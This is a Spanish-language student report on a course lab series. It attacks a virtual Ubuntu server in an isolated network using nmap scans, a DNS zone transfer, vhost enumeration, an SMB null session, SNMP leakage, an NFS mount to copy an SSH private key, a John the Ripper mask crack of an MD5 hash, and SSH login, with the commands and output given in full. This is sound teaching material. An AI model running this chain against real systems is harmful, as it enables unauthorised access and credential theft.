# Reporte Consolidado — Primer Parcial (Prácticas 1 a 6)

| Campo | Detalle |
| :--- | :--- |
| **Fecha de Ejecución** | 2026-10-20 |
| **Máquina Origen (Atacante)** | `Kali-Linux-CLI` (`192.168.1.5` / `192.168.1.4`) |
| **Máquina Destino (Target)** | `ubuntuServer` (`192.168.1.101` / `192.168.1.3` — `cetilab.local`) |
| **Red Virtual** | NAT Network `cetipracticas` (`192.168.1.0/24`) |
| **Servicios Auditados** | ICMP, TCP/UDP Scan, DNS (`53`), HTTP (`80`/`8080`), SMB (`139`/`445`), SNMP (`161/UDP`), NFS (`2049`), SSH (`22`) |
| **Herramientas Utilizadas** | `nmap`, `ping`, `dig`, `gobuster`, `Burp Suite` + `FoxyProxy`, `smbmap`, `mount.cifs`, `snmpwalk`, `mount.nfs`, `john`, `ssh` |
| **Script Automatizado** | [`scripts/practicas/parcial1_practicas_01_a_06.sh`](../../scripts/practicas/parcial1_practicas_01_a_06.sh) (basado en [`auto_hack.sh.txt`](../../auto_hack.sh.txt)) |

---

## 1. Objetivos del Bloque de Prácticas (1 a 6)

1. **Práctica 1 (Nmap y Descubrimiento)**: Identificar los hosts activos en el segmento `192.168.1.0/24` y enumerar puertos abiertos, versiones y scripts por defecto en `192.168.1.101`.
2. **Práctica 2 y 2.5 (DNS y Transferencia de Zona AXFR)**: Registrar el host inicial `admin-backup` y explotar una transferencia de zona completa (`AXFR`) contra `ISC BIND 9.18` para descubrir todos los subdominios de `cetilab.local`.
3. **Práctica 3 (Gobuster VHOST)**: Enumerar Virtual Hosts HTTP activos sobre `http://cetilab.local`.
4. **Práctica 4 (Auditoría Web con Burp Suite)**: Interceptar tráfico hacia `app.cetilab.local` con FoxyProxy y Burp Suite para vulnerar la autenticación mediante SQL Injection (SQLi).
5. **Práctica 5, 5.5 y 5.6 (SMB, SNMP y NFS)**: Enumerar recursos compartidos SMB (`archivos_ti`) mediante sesión nula, recolectar información crítica expuesta por SNMP v2c (`public`) y montar la exportación NFS (`/srv/nfs/respaldos_ti`) para extraer la llave privada SSH `developer.key`.
6. **Práctica 6 (John the Ripper y Acceso Inicial SSH)**: Crackear el hash MD5 (`fcd065c1541dc1f64cce023e9f9e4900`) mediante ataque de máscara (`Ceti?d?d?d?d`) y obtener acceso interactivo por SSH como el usuario `developer@cetilab.local`.

---

## 2. Desarrollo Técnico y Salidas Reales Obtenidas

### Práctica 1: Descubrimiento de Red y Escaneo de Servicios con Nmap

**Comandos Ejecutados**:
```bash
nmap -sn 192.168.1.0/24
nmap -sC -sV 192.168.1.101
```

**Resultado Obtenido**:
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-20 16:35 -0400
Nmap scan report for 192.168.1.1
Host is up (0.00039s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.1.2
Host is up (0.00027s latency).
MAC Address: 08:00:27:02:40:0B (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.3
Host is up (0.0016s latency).
MAC Address: 08:00:27:BE:9A:22 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.101
Host is up (0.00088s latency).
MAC Address: 08:00:27:BE:9A:22 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.5
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.97 seconds

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp        Postfix smtpd (commonName=cetipracticas)
53/tcp   open  domain      ISC BIND 9.18.39-0ubuntu0.22.04.4 (Ubuntu Linux)
80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu)) - http-title: Portal Interno CETI
111/tcp  open  rpcbind     2-4 (RPC #100000) -> nfs (2049), mountd, nlockmgr, status, nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4 (NetBIOS name: CETIPRACTICAS)
2049/tcp open  nfs_acl     3 (RPC #100227)
8080/tcp open  http        nginx 1.18.0 (Ubuntu) - http-title: Portal Interno CETI
```

> 📸 **[Espacio para Captura de Pantalla #01: Escaneo Nmap de hosts activos y puertos/servicios en `192.168.1.101`]**
> ![Evidencia 01](./evidencias/practica-01/evidencia-01.png)

---

### Práctica 2 y 2.5: Resolución de `admin-backup`, Transferencia de Zona DNS (`AXFR`) y `/etc/hosts`

**Comandos Ejecutados**:
```bash
echo "192.168.1.101 admin-backup" >> /etc/hosts
ping -c 3 admin-backup
dig @192.168.1.101 cetilab.local -t axfr
```

**Resultado Obtenido**:
```text
PING admin-backup (192.168.1.101) 56(84) bytes of data.
64 bytes from admin-backup (192.168.1.101): icmp_seq=1 ttl=64 time=1.12 ms
64 bytes from admin-backup (192.168.1.101): icmp_seq=2 ttl=64 time=0.623 ms
64 bytes from admin-backup (192.168.1.101): icmp_seq=3 ttl=64 time=0.624 ms

; <<>> DiG 9.20.23-1-Debian <<>> @192.168.1.101 cetilab.local -t axfr
cetilab.local.          604800  IN      SOA     ns1.cetilab.local. root.cetilab.local. 2026081801 604800 86400 2419200 604800
cetilab.local.          604800  IN      NS      ns1.cetilab.local.
cetilab.local.          604800  IN      A       192.168.1.101
app.cetilab.local.      604800  IN      A       192.168.1.101
db-mongo.cetilab.local. 604800  IN      A       192.168.1.101
db-mysql.cetilab.local. 604800  IN      A       192.168.1.101
files.cetilab.local.    604800  IN      A       192.168.1.101
ftp.cetilab.local.      604800  IN      A       192.168.1.101
mail.cetilab.local.     604800  IN      A       192.168.1.101
nfs.cetilab.local.      604800  IN      A       192.168.1.101
ns1.cetilab.local.      604800  IN      A       192.168.1.101
snmp.cetilab.local.     604800  IN      A       192.168.1.101
ssh.cetilab.local.      604800  IN      A       192.168.1.101
www.cetilab.local.      604800  IN      A       192.168.1.101
;; XFR size: 15 records (messages 1, bytes 411)
```

**Actualización de `/etc/hosts`**:
```text
10.0.2.3    cetipracticas
192.168.1.101 admin-backup
192.168.1.101 cetilab.local app.cetilab.local db-mongo.cetilab.local db-mysql.cetilab.local files.cetilab.local ftp.cetilab.local mail.cetilab.local nfs.cetilab.local ns1.cetilab.local snmp.cetilab.local ssh.cetilab.local www.cetilab.local
```

> 📸 **[Espacio para Captura de Pantalla #02: Ping a `admin-backup`, salida de `dig axfr` con los 11 subdominios y `/etc/hosts` actualizado]**
> ![Evidencia 02](./evidencias/practica-02/evidencia-02.png)

---

### Práctica 3: Enumeración de Virtual Hosts con Gobuster

**Comando Ejecutado**:
```bash
gobuster vhost -u http://cetilab.local -w /usr/share/dirb/wordlists/diccionario.txt
```

**Resultado Obtenido**:
```text
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
app.cetilab.local Status: 200 [Size: 1233]
Progress: 13 / 13 (100.00%)
===============================================================
Finished
===============================================================
```

> 📸 **[Espacio para Captura de Pantalla #03: Hallazgo del VHOST `app.cetilab.local` (Status: 200, Size: 1233)]**
> ![Evidencia 03](./evidencias/practica-03/evidencia-03.png)

---

### Práctica 4: Auditoría Web e Inyección SQL con Burp Suite y FoxyProxy

**Descripción**:
Se encamina el tráfico del navegador en Kali Linux a través de `FoxyProxy` (`127.0.0.1:8080`) hacia `Burp Suite` para interceptar y manipular la petición de inicio de sesión en `http://app.cetilab.local`.

> 📸 **[Espacio para Captura de Pantalla #04: Intercepción de petición en Burp Suite y bypass/obtención de credenciales en `app.cetilab.local`]**
> ![Evidencia 04](./evidencias/practica-04/evidencia-04.png)

---

### Práctica 5, 5.5 y 5.6: Enumeración SMB (`SMBMap`), Fuga SNMP (`snmpwalk`) y Extracción de Llave SSH vía NFS

#### 5.1 Enumeración y Montaje SMB (`archivos_ti`)
**Comandos Ejecutados**:
```bash
smbmap -H cetilab.local
mkdir -p /mnt/archivoCompartido
mount -t cifs //app.cetilab.local/archivos_ti /mnt/archivoCompartido -o guest,domain=cetilab.local
ls -la /mnt/archivoCompartido
```

**Resultado Obtenido**:
```text
[+] IP: 192.168.1.101:445       Name: cetilab.local             Status: NULL Session
        Disk                                                    Permissions Comment
        ----                                                    ----------- -------
        print$                                                  NO ACCESS   Printer Drivers
        archivos_ti                                             READ ONLY
        IPC$                                                    NO ACCESS   IPC Service (cetipracticas server (Samba, Ubuntu))

total 12
drwxr-xr-x 2 root root    0 Aug 18 15:53 .
drwxr-xr-x 4 root root 4096 Sep 14 11:59 ..
-rwxr-xr-x 1 root root  298 Aug 18 15:48 nota_desarrollo.txt
-rwxr-xr-x 1 root root  368 Aug 18 15:53 respaldo_credenciales.txt
```

#### 5.2 Enumeración SNMP v2c (`public`)
**Comando Ejecutado**:
```bash
snmpwalk -v 2c -c public cetilab.local
```

**Resultado Obtenido (Extracto Crítico)**:
```text
iso.3.6.1.2.1.1.1.0 = STRING: "Linux cetipracticas 5.15.0-187-generic #197-Ubuntu SMP Fri Jul 17 19:17:01 UTC 2026 x86_64"
iso.3.6.1.2.1.1.4.0 = STRING: "admin@cetilab.local"
iso.3.6.1.2.1.1.5.0 = STRING: "cetipracticas"
iso.3.6.1.2.1.1.6.0 = STRING: "\"NFS_EXPORT: /srv/nfs/respaldos_ti | TARGET_USER: developer\""
```

#### 5.3 Montaje NFS y Extracción de `developer.key`
**Comandos Ejecutados**:
```bash
mkdir -p /mnt/respaldos
mount -t nfs cetilab.local:/srv/nfs/respaldos_ti /mnt/respaldos
cp /mnt/respaldos/developer.key /home/kali/
chown kali:kali /home/kali/developer.key
chmod 600 /home/kali/developer.key
ls -la /home/kali/developer.key
```

**Resultado Obtenido**:
```text
Copiando llave SSH a tu carpeta personal...
-rw------- 1 kali kali 1823 Oct 20 16:36 /home/kali/developer.key
```

> 📸 **[Espacio para Captura de Pantalla #05: Salida de SMBMap, SNMP (`sysLocation` revelando ruta NFS y usuario `developer`) y llave `developer.key` con permisos `600`]**
> ![Evidencia 05](./evidencias/practica-05/evidencia-05.png)

---

### Práctica 6: Crackeo de Hash MD5 con John the Ripper y Acceso SSH (`developer`)

**Comandos Ejecutados**:
```bash
echo "fcd065c1541dc1f64cce023e9f9e4900" > /home/kali/hash_practica6.txt
john --format=raw-md5 --mask=Ceti?d?d?d?d /home/kali/hash_practica6.txt
john --show --format=raw-md5 /home/kali/hash_practica6.txt
ssh -i /home/kali/developer.key developer@cetilab.local
```

**Resultado Obtenido**:
```text
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
?:Ceti2245
1 password hash cracked, 0 left

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-187-generic x86_64)
  System load:  0.01               Processes:               152
  Usage of /:   31.3% of 23.45GB   Users logged in:         0
  Memory usage: 40%                IPv4 address for enp0s3: 192.168.1.101
  Swap usage:   0%                 IPv4 address for enp0s3: 192.168.1.3
developer@cetipracticas:~$
```

> 📸 **[Espacio para Captura de Pantalla #06: Hash MD5 crackeado (`Ceti2245`) con John the Ripper y sesión SSH activa como `developer@cetipracticas`]**
> ![Evidencia 06](./evidencias/practica-06/evidencia-06.png)

---

## 3. Resumen de Hallazgos y Debilidades Explotadas

| Práctica | Servicio / Vector | Debilidad Técnica | Impacto Obtenido |
| :--- | :--- | :--- | :--- |
| **2.5** | DNS (`53/TCP`) | Transferencia de zona (`AXFR`) abierta sin restricción de IP (`allow-transfer`). | Exposición completa de los 11 subdominios internos de `cetilab.local`. |
| **3 & 4** | HTTP (`80/TCP`) | Virtual Host `app.cetilab.local` vulnerable a inyección SQL. | Evasión de control de acceso y extracción de información de aplicación. |
| **5** | SMB (`445/TCP`) | Recurso `archivos_ti` accesible vía *Null Session* (`guest`). | Lectura de `nota_desarrollo.txt` y `respaldo_credenciales.txt`. |
| **5.5** | SNMP (`161/UDP`) | Comunidad por defecto `public` habilitada con metadatos sensibles en `sysLocation`. | Descubrimiento directo de `/srv/nfs/respaldos_ti` y usuario objetivo `developer`. |
| **5.6** | NFS (`2049/TCP`) | Exportación `/srv/nfs/respaldos_ti` accesible sin autenticación de red. | Extracción de la llave privada SSH `developer.key`. |
| **6** | Criptografía / SSH (`22/TCP`) | Hash en formato débil (`Raw-MD5`) con patrón predecible (`Ceti2245`). | Obtención de acceso interactivo al servidor `ubuntuServer` como `developer`. |
